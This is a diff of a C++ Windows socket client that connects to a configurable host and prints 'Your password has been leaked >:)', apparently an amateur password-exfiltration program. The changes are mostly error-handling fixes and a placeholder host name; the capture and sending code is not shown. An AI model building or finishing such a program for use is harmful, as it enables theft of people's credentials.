@@ -1,10 +1,10 @@
 #include <iostream>
+#include <WinSock2.h>
 #include <windows.h>
 #include <string.h>
 #include <wchar.h>
 #include <winuser.h>
 #include <windef.h>
-#include <WinSock2.h>
 #include <Windows.h>
 #include <ws2tcpip.h>
 #include <map>
@@ -107,22 +107,23 @@ int main() {
     
     int result = WSAStartup(MAKEWORD(2,2), &wsaData);
     if (result) {
-        perror("WSAStartup failed: ");
+        cout << "WSAStartup failed: " << WSAGetLastError() << endl;
         return 1;
     }
 
     struct addrinfo *info = NULL, hints;
+    ZeroMemory(&hints, sizeof(hints));
 
     hints.ai_family   = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    PCSTR HostAdress = "http://localhost:8080/"; //I'll change this whenever it becomes necessary
+    PCSTR HostAdress = "Insert-Host-Name-Here"; //I'll change this whenever it becomes necessary
 
     result = getaddrinfo(HostAdress, PortNumber, &hints, &info);
 
     if (result) {
-        perror("Getaddrinfo failed: ");
+        cout << "Getaddrinfo failed: " << WSAGetLastError() << endl;
         WSACleanup();
         return 1;
     }
@@ -151,7 +152,9 @@ int main() {
     freeaddrinfo(info);
 
     if (TargetSocket == INVALID_SOCKET) {
-        perror("Connection failed, unable to connect to the target socket: ");
+        cout << "Connection failed, unable to connect to the target socket: "
+        << WSAGetLastError() << endl;
+
         WSACleanup();
         return 1;
     }
@@ -168,7 +171,7 @@ int main() {
         return 1;
     }
 
-    cout << "Password has been leaked >:)" << endl;
+    cout << "Your password has been leaked >:)" << endl;
 
     result = shutdown(TargetSocket, SD_SEND);
     if (result == SOCKET_ERROR) {
